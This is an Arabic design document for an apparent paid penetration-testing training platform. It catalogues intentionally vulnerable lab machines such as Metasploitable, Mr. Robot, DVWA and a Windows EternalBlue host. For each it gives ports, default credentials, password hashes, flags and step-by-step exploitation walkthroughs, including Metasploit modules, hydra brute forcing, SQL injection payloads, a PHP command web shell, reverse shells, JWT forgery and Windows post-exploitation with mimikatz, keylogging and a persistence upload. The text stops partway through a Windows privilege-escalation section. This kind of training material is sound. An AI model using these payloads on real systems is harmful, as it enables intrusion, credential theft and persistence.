# 🖥️ VirtualLab v4.0 — PenGuide Cyber Range
## المختبر الافتراضي الاحترافي الشامل — بديل HackTheBox & TryHackMe

> **الإصدار:** v4.0 — النسخة المطوّرة الموسعة  
> **المنصة:** PenGuide — بناها عبدالله المسن  
> **الهدف:** بيئة تدريب عملي كاملة لاختبار الاختراق الأخلاقي تغني عن أي منصة خارجية  
> **التغطية:** 32 جهاز افتراضي + 4 شبكات معقدة + 8 سيناريوهات هجوم + 6 تحديات CTF أسبوعية

---

## 📑 جدول المحتويات

1. [نظرة عامة وفلسفة المختبر](#1-نظرة-عامة-وفلسفة-المختبر)
2. [بنية النظام والملفات](#2-بنية-النظام-والملفات)
3. [قاعدة بيانات الأجهزة الكاملة (32 جهاز)](#3-قاعدة-بيانات-الأجهزة-الكاملة)
4. [الشبكات والسيناريوهات المتقدمة](#4-الشبكات-والسيناريوهات-المتقدمة)
5. [نظام التحديات والـ CTF الأسبوعي](#5-نظام-التحديات-والـ-ctf-الأسبوعي)
6. [الكود الكامل — VirtualLab.tsx](#6-الكود-الكامل)
7. [محرك الـ Terminal الذكي](#7-محرك-الـ-terminal-الذكي)
8. [نظام التكامل مع المساعد الذكي AI](#8-نظام-التكامل-مع-المساعد-الذكي-ai)
9. [نظام النقاط والشارات والـ Leaderboard](#9-نظام-النقاط-والشارات-والـ-leaderboard)
10. [قاعدة البيانات Supabase](#10-قاعدة-البيانات-supabase)
11. [نظام الصلاحيات (زائر / تجربة / مشترك / أدمن)](#11-نظام-الصلاحيات)
12. [منهجية التعلم والـ Roadmaps](#12-منهجية-التعلم-والـ-roadmaps)
13. [إرسال للـ Lovable](#13-إرسال-للـ-lovable)

---

## 1. نظرة عامة وفلسفة المختبر

### 🎯 الفلسفة الأساسية

**VirtualLab v4.0** ليس مجرد محاكاة سطحية — بل بيئة تعليمية متكاملة مبنية على:

```
┌─────────────────────────────────────────────────────────────┐
│  المبادئ الخمسة:                                            │
│  ─────────────                                              │
│  1️⃣  واقعية كاملة     → كل ثغرة، كل CVE، كل بايلود حقيقي  │
│  2️⃣  تكامل تعليمي     → AI يرشد + شرح يتبع كل خطوة         │
│  3️⃣  تدرج منهجي       → من Script Kiddie إلى Red Teamer    │
│  4️⃣  محاكاة ذكية       → استجابة الـ Terminal كأنه حقيقي    │
│  5️⃣  أمان أخلاقي       → كل عملية مراقبة وموثّقة            │
└─────────────────────────────────────────────────────────────┘
```

### 🆚 المقارنة مع المنصات الخارجية

| الميزة | HackTheBox | TryHackMe | **VirtualLab v4.0** |
|--------|------------|-----------|---------------------|
| اشتراك شهري | $14-20 | $14 | **$5 / 3 شهور فقط** |
| اللغة العربية | ❌ | ❌ | ✅ **كاملة + RTL** |
| AI مرشد | ❌ | محدود | ✅ **مدمج بالكامل** |
| منهج عربي | ❌ | ❌ | ✅ **منهج كامل** |
| لا يحتاج VPN | ❌ | ❌ | ✅ **فوري في المتصفح** |
| تشغيل على أي جهاز | ❌ | ❌ | ✅ **حتى الموبايل** |
| Replay مع شرح | محدود | محدود | ✅ **walkthrough تفاعلي** |
| Multi-network pivoting | متوفر | محدود | ✅ **3 شبكات معقدة** |
| Attack chains | محدود | ❌ | ✅ **8 سيناريوهات** |

### 📊 إحصائيات المحتوى

```
══════════════════════════════════════════════════════════
  المحتوى الكلي
══════════════════════════════════════════════════════════
  🖥️  أجهزة افتراضية:        32 جهاز
  🌐  شبكات معقدة:           4 شبكات (Pivoting + AD + Cloud)
  🎯  سيناريوهات هجوم:        8 سيناريوهات كاملة
  🚩  أعلام (Flags):          120+ flag
  🏆  نقاط ممكنة:             8,500 نقطة
  💀  ثغرات CVE:              85+ CVE حقيقي موثّق
  🔧  أوامر مدعومة:           150+ أمر
  🎓  Roadmaps:                6 مسارات تعلم متدرجة
  🎮  CTF أسبوعي:              تحدي جديد كل أحد
  🛡️  Blue Team Labs:         5 مختبرات دفاعية
══════════════════════════════════════════════════════════
```

### 🗂️ الفئات الكاملة (12 فئة)

| الفئة | الكود | عدد الأجهزة | الصعوبة |
|-------|------|------------|---------|
| 🟢 Linux Beginner | `linux-easy` | 5 | مبتدئ |
| 🟢 Web Beginner | `web-easy` | 4 | مبتدئ |
| 🟡 Linux Intermediate | `linux-med` | 4 | متوسط |
| 🟡 Web Intermediate | `web-med` | 3 | متوسط |
| 🪟 Windows | `windows` | 3 | متوسط - متقدم |
| 🏢 Active Directory | `ad` | 3 | متقدم |
| 🔴 Buffer Overflow | `bof` | 2 | متقدم - خبير |
| 🌐 Pivoting & Network | `pivot` | 2 | متقدم - خبير |
| 📱 Mobile (Android) | `mobile` | 2 | متوسط - متقدم |
| ☁️ Cloud (AWS/Azure) | `cloud` | 2 | متقدم |
| 🔬 Reverse Engineering | `revrse` | 1 | متقدم |
| 🔍 Forensics & Crypto | `forensics` | 1 | متوسط |

---

## 2. بنية النظام والملفات

```
/src
├── pages/
│   └── lab/
│       ├── index.tsx              ← /lab — الصفحة الرئيسية
│       ├── [machineId].tsx        ← /lab/:id — صفحة كل جهاز
│       ├── network/[netId].tsx    ← /lab/network/:id — شبكة كاملة
│       ├── ctf/[week].tsx         ← /lab/ctf/:week — CTF أسبوعي
│       └── walkthrough/[id].tsx   ← /lab/walkthrough/:id — شرح كامل
│
├── components/lab/
│   ├── VirtualLab.tsx             ← المكوّن الرئيسي
│   ├── MachineCard.tsx            ← بطاقة جهاز
│   ├── MachineDetail.tsx          ← تفاصيل الجهاز
│   ├── NetworkMap.tsx             ← خريطة الشبكة (SVG تفاعلية)
│   ├── Terminal.tsx               ← الـ Terminal التفاعلي
│   ├── TerminalEngine.ts          ← محرك الأوامر
│   ├── ProgressTracker.tsx        ← شريط التقدم 6 مراحل
│   ├── HintPanel.tsx              ← لوحة التلميحات
│   ├── AIHelperButton.tsx         ← زر استدعاء AI من المختبر
│   ├── ScoreBoard.tsx             ← لوحة المتصدرين
│   ├── BadgeShowcase.tsx          ← عرض الشارات
│   ├── ReportGenerator.tsx        ← مولّد التقارير
│   ├── ReplayMode.tsx             ← وضع Replay مع شرح
│   ├── CTFCard.tsx                ← بطاقة تحدي CTF
│   ├── DailyChallenge.tsx         ← التحدي اليومي
│   ├── AttackChainView.tsx        ← عرض سيناريو هجوم
│   ├── BlueTeamLab.tsx            ← مختبر دفاعي
│   └── LabAccessGuard.tsx         ← حارس صلاحيات (زائر/مشترك)
│
├── data/
│   ├── machines.ts                ← قاعدة بيانات 32 جهاز
│   ├── networks.ts                ← شبكات pivoting + AD
│   ├── attackChains.ts            ← 8 سيناريوهات
│   ├── ctfChallenges.ts           ← تحديات CTF
│   ├── badges.ts                  ← 24 شارة
│   ├── walkthroughs.ts            ← شروحات لكل جهاز
│   ├── exploits.ts                ← قاعدة بيانات الثغرات
│   └── commandResponses.ts        ← ردود الـ Terminal لكل أمر
│
├── lib/lab/
│   ├── terminalSimulator.ts       ← محاكي Terminal الذكي
│   ├── pivotingEngine.ts          ← محرك multi-network
│   ├── pointsCalculator.ts        ← حساب النقاط والـ multipliers
│   ├── badgeEngine.ts             ← منطق الشارات والإنجازات
│   ├── progressStore.ts           ← Zustand store للتقدم
│   ├── reportBuilder.ts           ← تجميع التقارير (Markdown/PDF)
│   ├── replayRecorder.ts          ← تسجيل الأوامر للـ replay
│   ├── aiContextProvider.ts       ← يبني context للـ AI من حالة المختبر
│   └── permissionGuard.ts         ← فحص صلاحيات (زائر/تجربة/مشترك/أدمن)
│
└── types/lab/
    ├── machine.ts
    ├── network.ts
    ├── progress.ts
    └── badge.ts
```

---

## 3. قاعدة بيانات الأجهزة الكاملة

### 🟢 فئة Linux Beginner (5 أجهزة)

#### الجهاز 1 — Metasploitable 2 (الكلاسيكي)
```yaml
ID:           metasploitable2
IP:           10.10.10.10
Hostname:     msfable.lab.local
OS:           Ubuntu 8.04 (Hardy Heron)
Kernel:       Linux 2.6.24-16-server
Architecture: x86_64
RAM:          512MB
صعوبة:        مبتدئ ⭐
النقاط:       100
الفئة:        linux-easy
الوقت المتوقع: 30-45 دقيقة
```

**البورتات المفتوحة (20 بورت):**
| Port | Service | Version | Vuln | Note |
|------|---------|---------|------|------|
| 21 | ftp | vsftpd 2.3.4 | ✅ | CVE-2011-2523 — Backdoor :) face smile |
| 22 | ssh | OpenSSH 4.7p1 | ✅ | Weak ciphers + Debian SSL bug |
| 23 | telnet | Linux telnetd | ✅ | Cleartext + brute force |
| 25 | smtp | Postfix 2.5.5 | ⚠️ | User enum (VRFY) |
| 53 | dns | ISC BIND 9.4.2 | ⚠️ | Zone transfer |
| 80 | http | Apache 2.2.8 | ✅ | DVWA + Mutillidae + phpMyAdmin |
| 111 | rpcbind | 2-4 RPC | ⚠️ | NFS enumeration |
| 139 | netbios | Samba 3.0.20 | ✅ | usermap_script CVE-2007-2447 |
| 445 | smb | Samba 3.0.20 | ✅ | Trans2Open + usermap |
| 512 | exec | rexecd | ✅ | Hydra brute |
| 513 | login | rlogind | ✅ | rlogin -l root (no auth!) |
| 514 | shell | rshd | ✅ | RSH trust bypass |
| 1099 | java-rmi | GNU Classpath | ✅ | java_rmi_server RCE |
| 1524 | bindshell | Backdoor | ✅ | nc 10.10.10.10 1524 → root! |
| 2049 | nfs | NFS v2-4 | ✅ | no_root_squash |
| 2121 | ftp | ProFTPD 1.3.1 | ⚠️ | Backdoor mod |
| 3306 | mysql | MySQL 5.0.51a | ✅ | root:(empty) |
| 3632 | distccd | distcc v1 | ✅ | CVE-2004-2687 RCE |
| 5432 | postgresql | PostgreSQL 8.3 | ✅ | postgres:postgres |
| 5900 | vnc | VNC 3.3 | ✅ | Password: password |
| 6000 | x11 | Open Display | ✅ | Keylogger via X |
| 6667 | irc | UnrealIRCd 3.2.8.1 | ✅ | CVE-2010-2075 backdoor |
| 6697 | irc-ssl | UnrealIRCd | ✅ | Same backdoor |
| 8009 | ajp13 | Apache Jserv | ✅ | Ghostcat CVE-2020-1938 |
| 8180 | http | Tomcat 5.5 | ✅ | tomcat:tomcat — manager |
| 8787 | drb | Ruby DRb | ✅ | DRb RCE |

**المستخدمون (12 مستخدم):**
```
root      : toor              (uid: 0)
msfadmin  : msfadmin          (uid: 1000) — sudo all
user      : user              (uid: 1001)
service   : service           (uid: 1002)
postgres  : postgres          (uid: 108)
mysql     : (empty)           (uid: 109)
sys       : batman            (uid: 1003)
klog      : 123456789         (uid: 103)
ftp       : (locked)          (uid: 107)
games     : games             (uid: 5)
www-data  : (no shell)        (uid: 33)
nobody    : (no shell)        (uid: 65534)
```

**Hashes (/etc/shadow):**
```
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9.10:14742:0:99999:7:::
klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::
user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::
```

**الـ Flags (12 flag):**
```
FLAG{VSFTPD_BACKDOOR_PWNED}             — port 21 exploit
FLAG{TELNET_CRED_BRUTE}                 — port 23 hydra
FLAG{SAMBA_USERMAP_RCE}                 — port 139/445
FLAG{TOMCAT_DEFAULT_CREDS}              — port 8180
FLAG{UNREALIRCD_BACKDOOR}               — port 6667
FLAG{POSTGRES_DEFAULT_CREDS}            — port 5432
FLAG{MYSQL_NO_AUTH_ROOT}                — port 3306
FLAG{DISTCC_RCE}                        — port 3632
FLAG{NFS_NO_ROOT_SQUASH}                — port 2049
FLAG{VNC_WEAK_PASSWORD}                 — port 5900
FLAG{IRC_BACKDOOR_GAINED_ROOT}          — combined
FLAG{METASPLOITABLE_FULLY_OWNED_ROOT}   — final root
```

**مسارات الاستغلال (5 طرق مختلفة):**

```bash
# ═══ المسار 1: vsftpd Backdoor (الأسرع) ═══
nc 10.10.10.10 21
USER user:)
PASS x
# في نافذة ثانية:
nc 10.10.10.10 6200
id
# uid=0(root) gid=0(root) — DONE!

# ═══ المسار 2: Samba usermap_script ═══
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.10
set LHOST 10.10.10.100
exploit
# meterpreter > getuid → root

# ═══ المسار 3: UnrealIRCd Backdoor ═══
msfconsole
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 10.10.10.10
exploit

# ═══ المسار 4: Tomcat Default Creds ═══
hydra -L users.txt -P passwords.txt 10.10.10.10 -s 8180 \
  http-get /manager/html
# tomcat:tomcat → upload WAR → reverse shell

# ═══ المسار 5: Direct Bindshell (Cheat) ═══
nc 10.10.10.10 1524
# مباشرة root shell!
```

**التلميحات (Hint System):**
```
💡 Hint 1 (مجاني): جرّب نسخة vsftpd بالضبط — هل تذكر شيئاً عن سنة 2011؟
💡 Hint 2 (-5 نقاط): ابحث عن "smiley face" في exploitdb
💡 Hint 3 (-15 نقطة): use exploit/unix/ftp/vsftpd_234_backdoor
🎯 Solution Walkthrough: متاح بعد إكمال الجهاز فقط
```

---

#### الجهاز 2 — Kioptrix Level 1
```yaml
ID:           kioptrix1
IP:           10.10.10.11
OS:           Red Hat Linux 7.3
Kernel:       Linux 2.4.7-10
صعوبة:        مبتدئ ⭐
النقاط:       100
الفئة:        linux-easy
```

**البورتات:**
```
22/ssh    OpenSSH 2.9p2          — protocol 1.99 ⚠️
80/http   Apache 1.3.20          — mod_ssl 2.8.4 ✅ OpenFuck
111/rpc   portmapper             ⚠️
139/smb   Samba 2.2.1a           ✅ trans2open RCE
443/https Apache 1.3.20 + mod_ssl ✅ SSLv2 overflow
1024/kdm  unknown                 ⚠️
```

**Flags:**
```
FLAG{KIOPTRIX_OPENFUCK_ROOTED}
FLAG{KIOPTRIX_SAMBA_TRANSOPEN}
```

**Exploit Path:**
```bash
# طريقة 1: OpenFuck (الأشهر)
searchsploit OpenFuck
# 47080.c
gcc -o openfuck 47080.c -lcrypto
./openfuck 0x6b 10.10.10.11 443 -c 50

# طريقة 2: Samba trans2open
msfconsole
use exploit/linux/samba/trans2open
set RHOSTS 10.10.10.11
exploit
```

---

#### الجهاز 3 — Basic Pentesting 1
```yaml
ID:           basicpentest1
IP:           10.10.10.13
OS:           Ubuntu 16.04 LTS
صعوبة:        مبتدئ ⭐
النقاط:       100
الفئة:        linux-easy
```

**البورتات:**
```
21/ftp    ProFTPD 1.3.3c        ✅ mod_copy + Backdoor (CVE-2010-4221)
22/ssh    OpenSSH 7.2p2          ❌
80/http   Apache 2.4.18          ✅ /secret WordPress
139/smb   Samba 4.x              ✅
445/smb   Samba 4.x              ✅
```

**Flag:** `FLAG{BASIC_PENTEST_GNU_SCREEN_PRIVESC}`

**Exploit:**
```bash
# 1. Find WordPress
dirb http://10.10.10.13 → /secret/

# 2. WPScan
wpscan --url http://10.10.10.13/secret -e u
# users: admin

# 3. Password brute
hydra -l admin -P rockyou.txt 10.10.10.13 \
  -s 80 http-post-form "/secret/wp-login.php:log=^USER^&pwd=^PASS^:invalid"
# admin:admin

# 4. Theme editor → reverse shell

# 5. PrivEsc — GNU Screen 4.5.0 (CVE-2017-5618)
find / -perm -u=s 2>/dev/null | grep screen
/usr/bin/screen-4.5.0
# exploit script — get root
```

---

#### الجهاز 4 — Vulnix (NFS + LDAP)
```yaml
ID:           vulnix
IP:           10.10.10.14
OS:           Ubuntu 12.04 LTS
صعوبة:        مبتدئ-متوسط ⭐⭐
النقاط:       150
الفئة:        linux-easy
```

**البورتات:**
```
22/ssh    OpenSSH 5.9p1          ❌
25/smtp   Postfix                ✅ User Enum (VRFY/EXPN)
79/finger Linux fingerd          ✅ User Enum
110/pop3  Dovecot                ❌
111/rpc   portmapper             ⚠️
512-514   rsh/rexec/rlogin       ✅ rsh trust
2049/nfs  NFS                    ✅ no_root_squash
```

**Flags:** `FLAG{VULNIX_NFS_KEY_INJECTION}`, `FLAG{VULNIX_SUDOEDIT_PRIVESC}`

**Exploit:**
```bash
# 1. SMTP user enum
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.14

# 2. Hydra على SSH
hydra -L users.txt -P passwords.txt -t 4 ssh://10.10.10.14
# vulnix:letmein

# 3. NFS
showmount -e 10.10.10.14
# /home/vulnix
mkdir /tmp/nfs && mount -t nfs 10.10.10.14:/home/vulnix /tmp/nfs
ls -la /tmp/nfs   # Permission denied — uid mismatch

# 4. UID Match
useradd -u 2008 vulnix
su vulnix
mkdir /tmp/nfs/.ssh
ssh-keygen -t rsa
cat id_rsa.pub > /tmp/nfs/.ssh/authorized_keys

# 5. SSH login
ssh -i id_rsa vulnix@10.10.10.14

# 6. PrivEsc — sudoedit /etc/exports
sudo -l
sudoedit /etc/exports
# add: /root *(rw,no_root_squash)
exportfs -ra
# Re-mount as root from attacker → access /root
```

---

#### الجهاز 5 — Lame (HTB Classic Easy)
```yaml
ID:           lame
IP:           10.10.10.3
OS:           Ubuntu 8.04
صعوبة:        مبتدئ ⭐
النقاط:       100
الفئة:        linux-easy
```

**البورتات:** `21/ftp(vsftpd 2.3.4) | 22/ssh | 139/smb (Samba 3.0.20) | 445/smb | 3632/distccd`

**Flag:** `FLAG{LAME_USERMAP_SCRIPT}` 

**Exploit:** نفس Metasploitable لكن أبسط — Samba usermap_script أو distcc.

---

### 🟢 فئة Web Beginner (4 أجهزة)

#### الجهاز 6 — DVWA Master
```yaml
ID:           dvwa
IP:           10.10.10.20
OS:           Debian 11
صعوبة:        مبتدئ ⭐
النقاط:       150 (لإكمال جميع الثغرات الـ 13)
الفئة:        web-easy
```

**13 ثغرة كاملة (لكل ثغرة flag):**

| # | الثغرة | الصعوبة | Flag |
|---|--------|---------|------|
| 1 | Brute Force | Low/Med/High | `FLAG{DVWA_BRUTEFORCE_LOGIN}` |
| 2 | Command Injection | Low/Med/High | `FLAG{DVWA_CMD_INJECT}` |
| 3 | CSRF | Low/Med/High | `FLAG{DVWA_CSRF_PWORD_CHANGE}` |
| 4 | File Inclusion (LFI/RFI) | Low/Med/High | `FLAG{DVWA_LFI_ETC_PASSWD}` |
| 5 | File Upload | Low/Med/High | `FLAG{DVWA_PHP_SHELL_UPLOAD}` |
| 6 | Insecure CAPTCHA | Low/Med/High | `FLAG{DVWA_CAPTCHA_BYPASS}` |
| 7 | SQL Injection | Low/Med/High | `FLAG{DVWA_SQLI_UNION_USERS}` |
| 8 | SQL Injection (Blind) | Low/Med/High | `FLAG{DVWA_BLIND_SQLI_BOOLEAN}` |
| 9 | Weak Session IDs | Low/Med/High | `FLAG{DVWA_PREDICTABLE_SESSION}` |
| 10 | XSS DOM | Low/Med/High | `FLAG{DVWA_DOM_XSS}` |
| 11 | XSS Reflected | Low/Med/High | `FLAG{DVWA_REFLECTED_XSS}` |
| 12 | XSS Stored | Low/Med/High | `FLAG{DVWA_STORED_XSS}` |
| 13 | CSP Bypass | High | `FLAG{DVWA_CSP_BYPASS}` |

**الأمثلة الكاملة (SQLi Cheatsheet):**
```sql
-- Level Low
1' OR '1'='1'-- -

-- Get database
1' UNION SELECT 1, version()-- -

-- Get tables
1' UNION SELECT 1, GROUP_CONCAT(table_name)
FROM information_schema.tables 
WHERE table_schema=database()-- -

-- Dump users
1' UNION SELECT user, password FROM users-- -

-- Crack hashes (md5)
admin: 5f4dcc3b5aa765d61d8327deb882cf99 → "password"
gordo: 0d107d09f5bbe40cade3de5c71e9e9b7 → "abc123"
```

**File Upload (PHP Shell):**
```php
<?php
// shell.php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

---

#### الجهاز 7 — Mr. Robot (WordPress)
```yaml
ID:           mrrobot
IP:           10.10.10.21
OS:           Ubuntu 14.04 LTS
صعوبة:        متوسط ⭐⭐
النقاط:       200
الفئة:        web-easy
```

**البورتات:** `80/http | 443/https`

**3 Keys:**
```
Key 1: 073403c8a58a1f80d943455fb30724b9   (in /robots.txt)
Key 2: 822c73956184f694993bede3eb39f959   (after robot user shell)
Key 3: 04787ddef27c3dee1ee161b21670b4e4   (after root via nmap)
```

**Walkthrough الكامل:**
```bash
# 1. Recon
curl http://10.10.10.21/robots.txt
# User-agent: *
# fsocity.dic
# key-1-of-3.txt

curl http://10.10.10.21/key-1-of-3.txt
# 073403c8a58a1f80d943455fb30724b9 — Key 1!

curl http://10.10.10.21/fsocity.dic > fsocity.dic
sort -u fsocity.dic > fsocity_unique.dic   # unique passwords

# 2. WordPress enum
wpscan --url http://10.10.10.21 -e u
# Found user: elliot

# 3. Brute force WP login
hydra -l elliot -P fsocity_unique.dic 10.10.10.21 \
  http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid"
# elliot:ER28-0652

# 4. Reverse shell via theme editor
# Login → Appearance → Editor → 404.php
# Replace with PHP reverse shell

# Local listener:
nc -lvnp 4444

# Trigger:
curl http://10.10.10.21/wp-content/themes/twentyfifteen/404.php

# 5. Upgrade shell
python -c 'import pty; pty.spawn("/bin/bash")'

# 6. Read /home/robot/password.raw-md5
md5: c3fcd3d76192e4007dfb496cca67e13b
# crack: abcdefghijklmnopqrstuvwxyz

su robot
# Password: abcdefghijklmnopqrstuvwxyz

cat key-2-of-3.txt
# 822c73956184f694993bede3eb39f959 — Key 2!

# 7. PrivEsc — nmap interactive (CVE-2007-2744)
find / -perm -u=s 2>/dev/null | grep -v "Permission denied"
# /usr/local/bin/nmap

nmap --interactive
nmap> !sh
# id → uid=0(root)

cat /root/key-3-of-3.txt
# 04787ddef27c3dee1ee161b21670b4e4 — Key 3!
```

---

#### الجهاز 8 — HackableII (FTP + File Upload)
```yaml
ID:           hackable2
IP:           10.10.10.22
OS:           Ubuntu 20.04
صعوبة:        متوسط ⭐⭐
النقاط:       200
الفئة:        web-easy
```

**Exploit:**
```bash
# FTP anonymous
ftp 10.10.10.22
> anonymous / anything
> cd files
> put /usr/share/webshells/php/php-reverse-shell.php

# Trigger via web
curl http://10.10.10.22/files/php-reverse-shell.php

# Get www-data shell, find user
su shrek   # password in test.php

# PrivEsc
sudo -l
# (ALL) NOPASSWD: /usr/bin/python3.8
sudo python3.8 -c 'import os;os.system("/bin/bash")'
```

**Flag:** `FLAG{HACKABLE2_PYTHON_SUDO}`

---

#### الجهاز 9 — bWAPP (100+ Web Vulns)
```yaml
ID:           bwapp
IP:           10.10.10.23
OS:           Debian 9
صعوبة:        مبتدئ-متوسط ⭐⭐
النقاط:       200
الفئة:        web-easy
```

**ثغرات مدعومة:** A1 (Injection), A2 (Auth), A3 (XSS), A4 (IDOR), A5 (Misconfig), A6 (Sensitive), A7 (XXE), A8 (Deserialization), A9 (Components), A10 (Insufficient Logging) — **75+ تحدي فرعي**.

**Flag Pool:** كل تحدي فرعي له flag — مجموعها 30 flag.

---

### 🟡 فئة Linux Intermediate (4 أجهزة)

#### الجهاز 10 — Lord of the Root
```yaml
ID:           lordoftheroot
IP:           10.10.10.30
OS:           Ubuntu 14.04
صعوبة:        متوسط ⭐⭐
النقاط:       250
الفئة:        linux-med
```

**Notes:** Port knocking → SSH brute → SQL Injection → MySQL UDF privesc.

```bash
# 1. Port Knocking
for x in 1 2 3; do nmap -Pn --max-retries 0 -p $x 10.10.10.30; done
# Now port 1337 opens

# 2. SSH brute
hydra -l smeagol -P rockyou.txt ssh://10.10.10.30:1337

# 3. SQL Injection in /978345210/index.php
sqlmap -u "http://10.10.10.30/978345210/index.php?username=test&password=test" \
  --data="username=*&password=test" --dbs

# 4. PrivEsc — MySQL UDF
mysql -u root -p
# UDF raptor exploit
```

**Flag:** `FLAG{LOTR_MYSQL_UDF_PRIVESC}`

---

#### الجهاز 11 — Stapler (eCPPT-style)
```yaml
ID:           stapler
IP:           10.10.10.31
OS:           Ubuntu 16.04
صعوبة:        متوسط ⭐⭐⭐
النقاط:       300
الفئة:        linux-med
```

**Notes:** 10+ paths to root (FTP, SMB, Web, Wordpress).

**Flag:** `FLAG{STAPLER_KERNEL_4_4_PRIVESC}`

---

#### الجهاز 12 — SickOS 1.2
```yaml
ID:           sickos
IP:           10.10.10.32
صعوبة:        متوسط ⭐⭐
النقاط:       250
الفئة:        linux-med
```

**Notes:** PUT method abuse → Chkrootkit privesc (CVE-2014-0476).

**Flag:** `FLAG{SICKOS_CHKROOTKIT_PRIVESC}`

---

#### الجهاز 13 — Symfonos 1
```yaml
ID:           symfonos
IP:           10.10.10.33
صعوبة:        متوسط ⭐⭐
النقاط:       250
الفئة:        linux-med
```

**Notes:** SMB → LFI → log poisoning → SUID Binary.

**Flag:** `FLAG{SYMFONOS_LOG_POISONING}`

---

### 🟡 فئة Web Intermediate (3 أجهزة)

#### الجهاز 14 — Juice Shop (OWASP Top 10 Modern)
```yaml
ID:           juiceshop
IP:           10.10.10.40
OS:           Node.js 16
صعوبة:        متوسط ⭐⭐
النقاط:       350 (50+ challenges)
الفئة:        web-med
```

**Categories:**
- Broken Access Control (10 challenges)
- Broken Authentication (8 challenges)
- Cryptography (5 challenges)
- Injection (12 challenges)
- Sensitive Data Exposure (7 challenges)
- XSS (6 challenges)
- XXE (3 challenges)

**أمثلة:**
```sql
-- SQL Injection in login
Email: ' OR 1=1--
Password: anything
→ Login as admin

-- JWT manipulation
Token decode → change role → re-sign with weak key

-- IDOR
GET /api/Users/1 → /api/Users/2 → access other user
```

**Flag pool:** `FLAG{JUICE_<CATEGORY>_<NAME>}`

---

#### الجهاز 15 — GraphQL Vulnerable App
```yaml
ID:           graphql_vuln
IP:           10.10.10.41
OS:           Node.js
صعوبة:        متوسط-متقدم ⭐⭐⭐
النقاط:       300
الفئة:        web-med
```

**Vulns:** Introspection enabled, Authorization bypass via aliases, Batch attacks, Deep nested queries (DoS), SQL injection in resolvers.

```graphql
# Introspection
{
  __schema {
    types { name fields { name type { name } } }
  }
}

# Bypass with batch
mutation {
  login1: login(email:"admin", password:"a") { token }
  login2: login(email:"admin", password:"b") { token }
  ...
}
```

**Flag:** `FLAG{GRAPHQL_INTROSPECTION_LEAK}`, `FLAG{GRAPHQL_AUTH_BYPASS}`

---

#### الجهاز 16 — JWT Lab (Modern Auth)
```yaml
ID:           jwt_lab
IP:           10.10.10.42
صعوبة:        متوسط ⭐⭐
النقاط:       250
الفئة:        web-med
```

**Vulns:**
- alg:none attack
- Weak HMAC secret (brute force with `jwt_tool`)
- RS256 → HS256 confusion
- Kid parameter injection (path traversal)
- JWK injection

```bash
# alg:none
echo '{"alg":"none","typ":"JWT"}' | base64 -w 0
echo '{"sub":"admin"}' | base64 -w 0
# Combine with empty signature

# Weak secret brute
jwt_tool eyJ0eXAiOiJKV1Qi... -C -d /usr/share/wordlists/jwt.secrets.list

# kid injection
{"kid":"../../../../../../dev/null","alg":"HS256"}
# Sign with empty key
```

**Flag:** `FLAG{JWT_NONE_ALGORITHM}`, `FLAG{JWT_WEAK_HMAC}`, `FLAG{JWT_KID_TRAVERSAL}`

---

### 🪟 فئة Windows (3 أجهزة)

#### الجهاز 17 — Windows 7 (EternalBlue Classic)
```yaml
ID:           win7_eternalblue
IP:           10.10.10.50
OS:           Windows 7 SP1 x64
صعوبة:        مبتدئ-متوسط ⭐⭐
النقاط:       200
الفئة:        windows
```

**البورتات:**
```
135/msrpc
139/netbios
445/smb     ← MS17-010 ✅
3389/rdp    ← BlueKeep CVE-2019-0708 ✅ (Win7 specific)
```

**Exploit:**
```bash
# Method 1: Metasploit
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.50
set LHOST 10.10.10.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
# meterpreter > getuid → NT AUTHORITY\SYSTEM

# Method 2: Manual (worawit/MS17-010)
git clone https://github.com/worawit/MS17-010
python3 send_and_execute.py 10.10.10.50 shell.exe

# Method 3: BlueKeep (RDP)
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

**Post-exploitation:**
```
hashdump
mimikatz_command -f sekurlsa::logonpasswords
run post/windows/manage/migrate
screenshot
keyscan_start
upload /opt/persist/persistence.exe C:\\Windows\\Temp\\
```

**Flag:** `FLAG{WIN7_ETERNALBLUE_SYSTEM}`, `FLAG{WIN7_HASHDUMP}`, `FLAG{WIN7_KEYLOG}`

---

#### الجهاز 18 — Windows Server 2008 R2 (Multi-Vector)
```yaml
ID:           win2008r2
IP:           10.10.10.51
OS:           Windows Server 2008 R2 SP1
صعوبة:        متوسط ⭐⭐
النقاط:       250
الفئة:        windows
```

**Vulns:** MS17-010, MS08-067, BlueKeep, Print Spooler (PrintNightmare CVE-2021-34527).

---

#### الجهاز 19 — Windows 10 Modern (UAC Bypass + LPE)
```yaml
ID:           win10_modern
IP:           10.10.10.52
OS:           Windows 10 21H2
صعوبة:        متقدم ⭐⭐⭐
النقاط:       350
الفئة:        windows
```

**Vulns:**
- AlwaysInstallElevated (registry misconfig)
- Unquoted service path
- Weak service permissions
- DLL Hijacking
- Token impersonation (PrintSpoofer / RoguePotato / GodPotato)
- PrintNightmare (CVE-2021-34527)
- HiveNightmare / SeriousSAM (CVE-2021-36934)

**أوامر PrivEsc:**
```powershell
# winPEAS
.\winPEAS.exe quiet cmd

# Find unquoted services
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\\Windows"

# AlwaysInstallElevated check
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

# PrintSpoofer (SeImpersonate → SYSTEM)
